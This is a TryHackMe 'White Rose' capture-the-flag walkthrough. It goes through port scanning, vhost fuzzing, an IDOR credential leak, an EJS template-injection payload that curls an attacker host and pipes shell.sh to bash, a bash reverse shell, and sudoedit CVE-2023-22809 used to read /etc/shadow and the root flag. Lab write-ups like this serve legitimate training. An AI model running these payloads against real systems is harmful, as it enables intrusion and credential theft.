---
layout: post
title: White Rose (TryHackMe)
date: 2025-04-19
categories: [CTF, TryHackme]
tags: [SSTI, Sudo]
---

### Nmap

```bash
nmap -p- -T4 <Target-IP> # This will scan all the 65535 port.

nmap -A -p 22,80 -T4 <Target-IP> -oN WhiteRose_Nmap_result # From the above cmd output we can run the 2 ports in Aggressive mode.
```
- Why i didn't ran the "-A" scan in the first command itself it is because scanning all 65535 ports in Aggressive mode takes more time and it is waste of time. That's the reason i ran the results of the first cmd to the second.
- If you don't feel like doing this much we can utilize a tool called rustscan this will automate the above process.

### Rustscan

```bash
rustcan -a <Target-IP> -- -A -oN WhiteRose_nmap_result

#Cmd Breakdown

-a will scan for all ports
-- will pass the rustscan output to the nmap
-A aggressive mode in Nmap
-oN To save the output
```


### Nmap scan Result

```
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 60 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)

```
Given creds from the challange `Olivia Cortez:olivi8`

# Enumeration

## HTTP (80)

### Dirsearch

```bash
dirsearch -u http://<target-IP> 
```

- Nothing Intresting

### Vhost Fuzzing

```bash
ffuf -u http://cyprusbank.thm -w subdomain.txt -H "HOST:FUZZ.cuyprusbank.thm" 

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 167ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 167ms]
```

### admin.cyprusbank.thm

- Login page 
- `Olivia Cortez:olivi8` Using this credentials we can login

![Admin_panel](https://c00lrabbit.github.io/assets/Images/white-rose/WhiteR-Adm-panel.png){: .center-image }

## IDOR found on msg section in the URL
![IDOR In msg](https://c00lrabbit.github.io/assets/Images/white-rose/IDOR-Msg.png){: .center-image }

```
Found these creds using IDOR

Gayle Bev : <REDECTED>
```

Since Gayle is admin we can login as admin using these creds

## Found SSTI in `/settings` 

![ejs-vuln](https://c00lrabbit.github.io/assets/Images/white-rose/ejs-vuln.png){: .center-image }
- We found ejs and found a RCE about that https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

```
# SSTI Payload
name=test&password=test&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync('curl http://10.17.X.X:8000');s
```
- We got a hit in our python server

![Python-server](https://c00lrabbit.github.io/assets/Images/white-rose/python-server.png)

Shell.sh
```bash
bash -i >& /dev/tcp/10.17.X.X/9001 0>&1
```

payload
```
name=test&password=test&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync('curl http://10.17.X.X:8000/shell.sh|bash');s
```
- we got a shell and user flag

# Privilege Escalation

```bash
sudo -l

(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

sudoedit --v
Sudo version 1.9.12p1

```

#### Sudo version 1.9.12p1 leads to a vulnerability

https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis

## Exploit

#### To get the root Hash

```bash
export EDITOR="vi -- /etc/shadow"

sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
- After running this we can get the root hash then we can crack it through hashcat

```bash
hashcat -a 0 -m 3200 root-hash.txt rockyou.txt
```


#### To get the root flag

```bash
export EDITOR="vi -- /root/root.txt"

sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

- We got the root flag

## Conclusion

- WhiteRose is inspired from "Mr.Robot" Series, This box gives basic knowledege of SSTI(Server Side Template Imjection) and Priexc using Sudo.
- Most of us will ignore the sudo to check for vuln ("Including me"). This box teach us to check everything.
- Overall it is a stright forward enjoyable box which i like.

## As Heath aka TCM said "Enumeration is key to success"

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/O4O31I0TAI)